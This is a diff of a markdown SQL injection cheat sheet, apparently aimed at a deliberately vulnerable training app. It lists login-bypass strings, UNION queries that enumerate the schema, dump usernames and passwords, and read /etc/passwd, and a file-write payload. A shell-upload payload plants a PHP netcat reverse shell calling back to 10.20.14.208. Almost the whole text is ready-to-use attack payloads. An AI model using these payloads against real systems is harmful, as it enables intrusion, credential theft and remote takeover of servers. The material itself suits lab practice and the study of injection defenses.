@@ -5,12 +5,19 @@
   - username: ```admin'#``` 
   - password: ```1' or 1=1#``` 
 - Data Extracting 
-  - ```?page=user-info.php&username=z' union select 1,database(),user(),version(),5%23``` 
-  - ```?page=user-info.php&username=z' union select 1,table_name,null,null,5 from information_schema.tables``` 
-  - ```?page=user-info.php&username=z' union select 1,table_name,null,null,5 from information_schema.tables where table_schema='owasp10'``` 
-  - ```?page=user-info.php&username=z' union select 1,column_name,null,null,5 from information_schema.columns where table_name='accounts'``` 
-  - ```?page=user-info.php&username=z' union select 1,username,password,is_admin,5 from accounts``` 
-  - ```?page=user-info.php&username=z' union select null,load_file('/etc/passwd'),null,null,null``` 
+  - Seleting database version, Database, user
+    - ```?page=user-info.php&username=z' union select 1,database(),user(),version(),5%23``` 
+  - Database tables 
+    - ```... union select 1,table_name,null,null,5 from information_schema.tables``` 
+    - ```... union select 1,table_name,null,null,5 from information_schema.tables where table_schema='owasp10'``` 
+  - Table Columns
+    - ```... union select 1,column_name,null,null,5 from information_schema.columns where table_name='accounts'``` 
+  - Selecting data from table 
+    - ```... union select 1,username,password,is_admin,5 from accounts``` 
+  - Reading files
+    - ```... union select null,load_file('/etc/passwd'),null,null,null``` 
+  - Writing files
+    - ```UniOn selEct null,[file content] inTo outfile '/location/to/write/file/to' /*``` 
 - Shell upload 
   - Payload 
     - ```?page=user-info.php&username=z' union select '<?passthru("nc -e /bin/sh 10.20.14.208 8080");?>',null into outfile '/tmp/reverse.php'``` 
